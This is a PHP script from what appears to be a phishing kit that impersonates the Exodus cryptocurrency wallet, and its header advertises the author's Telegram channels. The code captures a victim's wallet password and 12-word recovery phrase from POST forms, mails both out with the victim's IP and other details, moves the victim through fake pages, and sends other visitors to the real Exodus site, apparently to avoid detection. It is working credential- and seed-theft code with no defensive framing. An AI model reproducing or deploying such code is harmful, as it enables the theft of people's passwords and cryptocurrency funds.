<?php

    /**//**//**//**//**//**

        Telegram : https://t.me/syst3mx
        Telegram Group : https://t.me/matos_x

    /**//**//**//**//**//**/


    include 'app.php';

    if( isset($_GET["redirection"]) && !empty($_GET['redirection']) ) {

        $red = $_GET['redirection'];
        $_SESSION['last_page'] = $red;
        $query = [];
        $parse_url = proper_parse_str($_SERVER['QUERY_STRING']);
        foreach($parse_url as $key => $val) {
            if( $key == 'redirection' ){
                unset($parse_url[$key]);
            } else {
                $query[] = $key . '=' . $val;
            }
        }
        if( is_array($query) ) {
            $query = "?" . implode('&',$query);
        }

        header("Location: " . randomix(24) . $query);
        exit();

    } else if( $_SERVER['REQUEST_METHOD'] == "POST" ) {

        if ($_POST['steeep'] == "pass") {
            $_SESSION['errors']     = [];
            $_SESSION['password']   = $_POST['password'];
            if( empty($_POST['password']) ) {
                $_SESSION['errors']['password'] = true;
            }
            if( count($_SESSION['errors']) == 0 ) {
                $subject = get_client_ip() . ' | EXODUS | Pass';
                $message = '/-- PASS INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Password : ' . $_POST['password'] . "\r\n";
                $message .= '/-- END PASS INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                location("words");
            } else {
                location("pass","&error=1");
            }
        }

        if ($_POST['steeep'] == "wallet") {
            $_SESSION['errors']     = [];
            
            $error = false;
            $wallet = [];

            for($i = 1; $i <= 12; $i++) {
                if( empty($_POST['n' . $i]) ) {
                    $error = true;
                }
                $wallet[] = $_POST['n'  . $i];
            }

            if( $error == false ) {
                $wallet = implode(' ',$wallet);
                $_POST['wallet'] = $wallet;
                $subject = get_client_ip() . ' | EXODUS | Wallet';
                $message = '/-- WALLET INFOS --/' . get_client_ip() . "\r\n";
                $message .= 'Wallet Keys : ' . $_POST['wallet'] . "\r\n";
                $message .= '/-- END WALLET INFOS --/' . "\r\n";
                $message .= victim_infos();
                send($subject,$message);
                if( $_POST['error'] > 0 ) {
                    location("success");
                }
                location("words","&error=1");
            } else {
                $error = $_POST['error'];
                location("words","&error=" . $error);
            }
        }

    } else {

        if( isset($_SESSION['last_page']) ) {
            redirect($_SESSION['last_page']);
        }

        header("Location: https://www.exodus.com/");
        exit();

    }
    

?>